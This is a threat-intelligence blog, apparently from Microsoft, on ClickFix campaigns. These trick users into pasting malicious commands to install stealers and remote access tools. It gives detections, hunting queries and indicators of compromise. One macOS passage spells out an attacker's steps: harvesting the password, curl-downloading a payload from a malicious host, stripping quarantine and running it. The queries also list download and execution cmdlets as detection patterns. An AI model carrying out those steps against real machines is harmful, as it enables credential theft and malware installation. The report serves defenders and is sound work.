popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we\u2019ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific Lumma Stealer malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration. The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target\u2019s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows Run dialog box, Windows Terminal, or Windows PowerShell. It\u2019s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even impersonate legitimate brands and organizations to further reduce suspicion from their targets. Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the Run dialog if it\u2019s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain. This blog discusses the different elements that make up a ClickFix campaign\u2014from the arrival vectors it comes with to its various implementations\u2014and provides different examples of threat campaigns we\u2019ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat. The ClickFix attack chain Before the click: Arrival vectors Inside the click: ClickFix implementations The \u201cfix\u201d: User-level code execution Beyond Windows: ClickFix targeting macOS users Behind the click: ClickFix kits and other services for sale ClickFix protection and detection The ClickFix attack chain A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure\u2014usually a landing page\u2014and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions. Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog. Once the malicious command is run by the user, malware is downloaded into the target device. We\u2019ve observed numerous threat actors that leverage ClickFix attacks deliver the following: Infostealers like LummaStealer , which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system These final payloads are often \u201cfileless\u201d, that is, they\u2019re seldom written to disk as a Windows executable ( .exe or .dll ) file. Instead, they\u2019re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we\u2019ve observed its code injected into LOLBins, such as msbuild.exe , regasm.exe , or powershell.exe . Figure 1. The typical ClickFix attack chain Case study: Lampion malware campaign To illustrate a typical ClickFix attack chain, let\u2019s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an infostealer focused on banking information. This campaign has since been observed in other countries\u2014including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico\u2014targeting organizations in the government, education, transportation, and financial services industries. As of June 2025, this campaign remains active. The Lampion malware campaign\u2019s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection: The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted. The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript ( .vbs ). The downloaded script then writes a second obfuscated .vbs file to the Windows %TEMP% directory and schedules it to run later using a hidden task. This second .vbs file downloads a third and much larger .vbs file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server. The third script also creates a .cmd file in the Windows startup folder, naming it after the user\u2019s hostname, and schedules a system restart. After the device restarts, the .cmd file launches a large DLL through rundll32.exe and attempts to deliver the final payload. However, during our investigation, the actual Lampion malware wasn\u2019t delivered because the download command was commented out of the code. Figure 2. Lampion infection chain Before the click: Arrival vectors Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We\u2019ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website. Phishing Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others. One of Storm-1607\u2019s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like reports_528647.html : Figure 3. Storm-1607 phishing email When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the How to fix button: Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure Clicking the button copied the malicious code on the user\u2019s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it: Figure 5. ClickFix lure displaying further instructions While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites: Figure 6. Storm-0426 phishing email The TDS redirected users to the attacker-controlled website mein-lonos-cloude[.]de , where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code: Figure 7. ClickFix landing page Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim\u2019s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance. The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA\u2019s official social media accounts in the footer, claimed that there was an issue with the recipient\u2019s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action: Figure 8. Phishing email impersonating the US SSA The message\u2019s call-to-action button, labeled Download Statement , was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings. When a user clicked the Download Statement button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain ( access-ssa-gov[.]es ). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust: Figure 9. ClickFix landing page impersonating the US SSA The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload: Figure 10. ClickFix instructions from the spoofed US SSA domain Malvertising Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button): Figure 11. Example of a free movie streaming website One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer: Figure 12. ClickFix landing page the users were redirected to if they clicked the \u201cPlay\u201d button on the free movie website This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as .mp3 , .mp4 , or .ogg . It\u2019s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to scam pages (including the ClickFix landing page) through the malvertising redirectors. Drive-by compromise Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware\u2014whether by using PDF files or URL links (sometimes copyright infringement -themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads. When a user visits the compromised site, the original page is briefly displayed before it\u2019s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate: Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site Inside the click: ClickFix implementations ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google\u2019s \u201c Aw, Snap! \u201d crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google\u2019s reCAPTCHA and Cloudflare\u2019s Turnstile solution. We\u2019ve even observed threat actors spoof social media platforms like Discord to trick users into believing they\u2019re joining an actual Discord server. Many elements go into building ClickFix lure pages\u2014from JavaScript inline frames (iframes) and HTML href codes to cascading style sheets (CSS) resources\u2014to make them more legitimate-looking. There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings. Impersonating Cloudflare Turnstile Figure 14 shows a partial screenshot of a ClickFix landing page, binancepizza[.]info , displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site: Figure 14. The ClickFix landing page binancepizza[.]info Its HTML source code clones this Cloudflare Turnstile style page using a href attribute to a CSS resource hosted by the Font Awesome library: Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt The page also references an HTML file ( field.html ) using a hidden iframe: Figure 16. HTML code highlighting hidden iframe and text needing to \u201cverify\u201d Within field.html , we see in Figure 17 that contentEl is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the Verify you are human check box, this script animates a fake spinner through runVerification() and sends postMessage(\u201ctrigger\u201d) to the parent window (the main landing page). Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user\u2019s clipboard (Figure 19): Figure 18. ClickFix instructions from binancepizza[.]info Figure 19. Malicious command copied to clipboard Figure 20 shows that the clipboard copy occurs once the code receives the message \u201ctrigger\u201d, which is sent by the field.html hidden iframe. Once that message is received, the script uses navigator.clipboard.writeText(codeToCopy) to copy the command to the clipboard. Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard Impersonating social platforms It\u2019s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets. Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join: Figure 21. Fake Discord server landing page implementing ClickFix. In this page\u2019s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the addEventListener method waits for the Verify button to get clicked (through verifyBtn ) so navgiator.clipboard.writetext(command) can copy the malicious command to the user\u2019s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use document.execCommand() , which is now deprecated. The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn\u2019t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the OBSCURE#BAT campaign delivering r77 rootkit. Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking \u201cverify\u201d The \u201cfix\u201d: User-level code execution The ClickFix technique typically presents its \u201cfix\u201d by instructing users to run malicious commands or code in the Windows Run dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren\u2019t familiar with this Windows OS component and what it\u2019s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics. Figure 23. Example of a multiple line warning in Windows Terminal Detecting Windows Run dialog misuse The Windows Run dialog ( Win + R ) is a trusted shell input user interface (UI) that\u2019s part of Windows Explorer ( explorer.exe ). Internally, it uses ShellExecute or CreateProcess APIs to resolve and launch commands. The input is limited to MAX_PATH , requiring a null-terminated string ( \\0 ) with a practical maximum of 259 characters. Additionally, as part of the Run dialog, Windows loads tiptsf.dll module in explorer.exe . This DLL file is related to the Text Services Framework (TSF), which provides input processor interface. Figure 24. The Windows Run dialog box Entering commands into the Run dialog leaves forensic traces\u2014most notably in the RunMRU (Most Recently Used) registry key. This key keeps a history of Run dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn\u2019t create a registry entry if the process execution fails. Figure 25. RunMRU registry key entry with a malicious ClickFix command To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins\u2014such as powershell , mshta , rundll32 , wscript , curl , and wget \u2014that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as iwr ( Invoke-WebRequest ), irm ( Invoke-RestMethod ), and iex ( Invoke-Expression ) being very prolific. Additional suspicious elements to check in entries within the RunRMU registry key include the following: First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, .live , . shop , .icu ), or code-sharing platforms such as pastes. First-stage payloads are often delivered and/or launched as specific file type such as .html , .hta , .txt , .zip , .msi , .bat , .ps1 , or .vbs The file type of the scripts might be renamed to media extensions (such as .png , .mp3 , .mp4 , .wav , and .jpg ) to hide their true intent. The file type might employ double file extension for evasion (for example, file.hta.mp4 ) URLs are often shortened using shorteners such as Bitly. A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following: \u2705 \u201cI am not a robot \u2013 reCAPTCHA Verification ID: XXXX\u201d # # I am not a robot: CAPTCHA Verification UID: XXXX\\ # \u201cHuman, not a robot: CAPTCHA: Verification ID: XXXX\u201d \u2714\ufe0f \u201cCloud identificator:XXXX\u201d Figure 26. Examples of generic ClickFix commands Obfuscation and execution techniques for defense evasion The command examples in the previous section aren\u2019t all encompassing, as we\u2019ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others. Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (\u201c&\u201d) delimiters, and benign sounding phrase (for example, \u201cMicrosoft Defender Services Secure Access\u201d) Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^) Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution Beyond Windows: ClickFix targeting macOS users In June 2025, a ClickFix campaign was reported to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks. The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications: Figure 30. ClickFix landing page with a fake CAPTCHA Like any other ClickFix campaign, when the user clicks the Alternate verification button, the page displays instructions the user has to follow to \u201cfix\u201d their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices: Figure 31. ClickFix instructions presented to the target user Meanwhile, in the background, a malicious command is copied to the user\u2019s clipboard. The command that is copied is different for macOS and Windows devices. Windows: Figure 32. Screenshot of the ClickFix command copied on Windows devices macOS: Figure 33. Screenshot of the ClickFix command copied on macOS devices The command that\u2019s copied for macOS devices instructs the system to perform the following actions: Get current user: username=$(whoami) Prompt for the correct password: Continuously prompt System Password: until the user enters the correct password Validate password: Use dscl . -authonly to verify the password against macOS directory services Store password: Save the valid password to the /tmp/.pass file Download payload: curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update Remove quarantine: Use the stolen password with sudo -S xattr -c to bypass macOS security Make an executable file: chmod +x /tmp/update Launch the malware: Run the downloaded file /tmp/update The file saved as update within the tmp directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials. Behind the click: ClickFix kits and other services for sale Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called \u201cWin + R\u201d) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows Run dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass Microsoft Defender SmartScreen ), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We\u2019ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500. Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as: Displaying a decoy PDF file after a target user is phished Payload execution timing Virtual machine (VM) detection and evasion (\u201cAnti VM\u201d) and user access control (UAC) bypass Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese Figure 34. Screenshot of a ClickFix builder, taken from the seller\u2019s demo video Figure 35. Another screenshot of a ClickFix builder, taken from the seller\u2019s demo video ClickFix protection and detection Microsoft Defender XDR offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page: Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the Run dialog, Microsoft Defender for Endpoint detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase. Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft\u2019s Antimalware Scan Interface (AMSI) provides scanning capabilities for both scripting environments and PowerShell applications. Defender\u2019s Cloud Protection delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, Microsoft Defender for Office 365 analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails. Additional attack chain coverage with network protection In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the RunMRU registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint\u2019s network protection feature . This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful. Recommendations Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat. Educate users to identify social engineering attacks. Ensure users are aware of what they copy and paste. Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use Microsoft Defender for Office 365 for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to recheck links on click and delete sent mail in response to newly acquired threat intelligence. Turn on safe attachments policies to check attachments to inbound email. Consider using enterprise-managed browsers , which provide multiple security features including security update requirements and data compliance policies . Block web pages from automatically running Flash plugins. Enable network protection and web protection in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants. Enable PowerShell script block logging to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging. Use PowerShell execution policies such as setting AllSigned or RemoteSigned tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control. Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary: Disable the Run dialog box ( Win + R ) key and remove the Run option from the Start Menu by selecting User Configuration > Administrative Templates > Start Menu and Taskbar > Remove Run menu from Start Menu . Create an App Control policy that prohibits the launch of native Windows binaries from Run . This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell. Configure Windows Terminal access and settings to warn users when the text they\u2019re pasting contains multiple lines . Microsoft Defender XDR customers can also implement the following attack surface reduction rules to harden an environment against PowerShell techniques used by threat actors: Block execution of potentially obfuscated scripts Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block JavaScript or VBScript from launching downloaded executable content Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Microsoft Defender Antivirus Microsoft Defender Antivirus detects this threat as the following malware: Behavior:Win32/ClickFix Behavior:Win32/SuspClickFix Trojan:Win32/ClickFix Trojan:Script/ClickFix Behavior:Win32/RegRunMRU Trojan:HTML/FakeCaptcha Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity: Suspicious command in RunMRU registry Use of living-off-the-land binary to run malicious code Suspicious process executed PowerShell command Suspicious PowerShell command line Suspicious \u2018SuspClickFix\u2019 behavior was blocked An active \u2018SuspDown\u2019 malware was prevented from executing via AMSI Suspicious \u2018MaleficAms\u2019 behavior was blocked An active \u2018ClickFix\u2019 malware in a command line was prevented from executing \u2018ClickFix\u2019 malware was prevented Information stealing malware activity Powershell made a suspicious network connection Suspicious process launch by Rundll32.exe Suspicious Rundll32 command-line Suspicious Scheduled Task Process Launched Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects malicious activity associated with this threat through the following alerts: A potentially malicious URL click was detected Email messages containing malicious URL removed after delivery Email messages removed after delivery A user clicked through to a potentially malicious URL Suspicious email sending patterns detected Email reported by user as malware or phish Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following pre-built promptbooks to automate incident response or investigation tasks related to this threat: Check impact of an external threat article Suspicious script analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender Threat Intelligence DarkGate malware samples delivered through fake Notion websites followed by ClickFix technique ClickFix and spoofed IT apps deliver RATs via Node.js over Cloudflare Quick Tunnels Phishing campaign impersonates Booking.com, delivers multiple commodity malware types Storm-1877 evolving tactics to target users with ClickFix attacks Email phishing campaign leads to Xworm ClickFix technique leverages clipboard to run malicious commands Lampion Is Back With ClickFix Lures Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: ClickFix commands execution Identify ClickFix commands execution. DeviceRegistryEvents | where ActionType =~ \"RegistryValueSet\" | where InitiatingProcessFileName =~ \"explorer.exe\" | where RegistryKey has @\"\\CurrentVersion\\Explorer\\RunMRU\" | where RegistryValueData has \"\u2705\" or (RegistryValueData has_any (\"powershell\", \"mshta\", \"curl\", \"msiexec\", \"^\") and RegistryValueData matches regex \"[\\u0400-\\u04FF\\u0370-\\u03FF\\u0590-\\u05FF\\u0600-\\u06FF\\u0E00-\\u0E7F\\u2C80-\\u2CFF\\u13A0-\\u13FF\\u0530-\\u058F\\u10A0-\\u10FF\\u0900-\\u097F]\") or (RegistryValueData has \"mshta\" and RegistryValueName !~ \"MRUList\" and RegistryValueData !in~ (\"mshta.exe\\\\1\", \"mshta\\\\1\")) or (RegistryValueData has_any (\"bitsadmin\", \"forfiles\", \"ProxyCommand=\") and RegistryValueName !~ \"MRUList\") or ((RegistryValueData startswith \"cmd\" or RegistryValueData startswith \"powershell\") and (RegistryValueData has_any (\"-W Hidden \", \" -eC \", \"curl\", \"E:jscript\", \"ssh\", \"Invoke-Expression\", \"UtcNow\", \"Floor\", \"DownloadString\", \"DownloadFile\", \"FromBase64String\", \"System.IO.Compression\", \"System.IO.MemoryStream\", \"iex\", \"Invoke-WebRequest\", \"iwr\", \"Get-ADDomainController\", \"InstallProduct\", \"-w h\", \"-X POST\", \"Invoke-RestMethod\", \"-NoP -W\", \".InVOKe\", \"-useb\", \"irm \", \"^\", \"[char]\", \"[scriptblock]\", \"-UserAgent\", \"UseBasicParsing\", \".Content\") or RegistryValueData matches regex @\"[-/\u2013][Ee^]{1,2}[NnCcOoDdEeMmAa^]*\\s[A-Za-z0-9+/=]{15,}\")) Lampion malware activity The following query searches for PowerShell command associated with Lampion malware activity that is used to download malicious files. DeviceProcessEvents | where InitiatingProcessFileName == \"powershell.exe\" | where InitiatingProcessParentFileName == \"explorer.exe\" | where FileName has_any (\"WScript.exe\") | where ProcessCommandLine contains \"\\\"PowerShell.exe\\\" -windowstyle minimized -Command\" and ProcessCommandLine has \"Invoke-WebRequest\" Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Below are the queries using Sentinel Advanced Security Information Model (ASIM) functions to hunt threats across both Microsoft first-party and third-party data sources. ASIM also supports deploying parsers to specific workspaces from GitHub , using an ARM template or manually Detect network IP and domain indicators of compromise using ASIM The following query checks IP addresses and domain IOCs across data sources supported by ASIM network session parser: //IP list and domain list- _Im_NetworkSession let lookback = 30d; let ioc_ip_addr = dynamic([\"185.234.72.186\", \"45.94.31.176\", \"3.138.123.13\", \"16.171.23.221\", \"3.23.103.13\", \"83.242.96.159\", \"5.8.9.77\"]); let ioc_domains = dynamic([\"mein-lonos-cloude.de\", \"derko-meru.online\", \"objectstorage.ap-singapore-2.oraclecloud.com\", \"tesra.shop\", \"zzzp.live\", \"cqsf.live\", \"access-ssa-gov.es\", \"binancepizza.info\", \"panel-spectrum.net\"]); _Im_NetworkSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or DstDomain has_any (ioc_domains) | summarize imNWS_mintime=min(TimeGenerated), imNWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, DstDomain, Dvc, EventProduct, EventVendor Detect network and files hashes indicators of compromise using ASIM The following query checks IP addresses, domains, and file hash IOCs across data sources supported by ASIM web session parser: //IP list - _Im_WebSession let lookback = 30d; let ioc_ip_addr = dynamic([\"185.234.72.186\", \"45.94.31.176\", \"3.138.123.13\", \"16.171.23.221\", \"3.23.103.13\", \"83.242.96.159\", \"5.8.9.77\"]); let ioc_sha_hashes =dynamic([\"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8\", \"592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718\", \"8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629\", \"d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9\", \"f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab\"]); _Im_WebSession(starttime=todatetime(ago(lookback)), endtime=now()) | where DstIpAddr in (ioc_ip_addr) or FileSHA256 in (ioc_sha_hashes) | summarize imWS_mintime=min(TimeGenerated), imWS_maxtime=max(TimeGenerated), EventCount=count() by SrcIpAddr, DstIpAddr, Url, Dvc, EventProduct, EventVendor // Domain list - _Im_WebSession let ioc_domains = dynamic([\"mein-lonos-cloude.de\", \"derko-meru.online\", \"objectstorage.ap-singapore-2.oraclecloud.com\", \"tesra.shop\", \"zzzp.live\", \"cqsf.live\", \"access-ssa-gov.es\", \"binancepizza.info\", \"panel-spectrum.net\"]); _Im_WebSession (url_has_any = ioc_domains) Detect files hashes indicators of compromise using ASIM The following query checks IP addresses and file hash IOCs across data sources supported by ASIM file event parser: // file hash list - imFileEvent let ioc_sha_hashes = dynamic([\"061d378ffed42913d537da177de5321c67178e27e26fca9337e472384d2798c8\", \"592ef7705b9b91e37653f9d376b5492b08b2e033888ed54a0fd08ab043114718\", \"8fb329ae6b590c545c242f0bef98191965f7afed42352a0c84ca3ccc63f68629\", \"d9ffe7d433d715a2bf9a31168656e965b893535ab2e2d9cab81d99f0ce0d10c9\", \"f77c924244765351609777434e0e51603e7b84c5a13eef7d5ec730823fc5ebab\"]); imFileEvent | where SrcFileSHA256 in (ioc_sha_hashes) or TargetFileSHA256 in (ioc_sha_hashes) | extend AccountName = tostring(split(User, @'')[1]), AccountNTDomain = tostring(split(User, @'')[0]) | extend AlgorithmType = \"SHA256\" Indicators of compromise Indicator Type Description First seen Last seen mein-lonos-cloude[.]de Domain Actor-controlled ClickFix landing page used in a MintsLoader campaign 2025-03-26 2025-03-26 derko-meru[.]online Domain MintsLoader C2 2025-03-26 2025-03-26 tesra[.]shop Domain Domain used in ClickFix command (entered into Run dialog) in a Lumma Stealer malvertising campaign 2025-04-02 2025-04-02 cqsf[.]live Domain Domain used in ClickFix command (entered into Run dialog) in the Latrodectus drive-by campaign 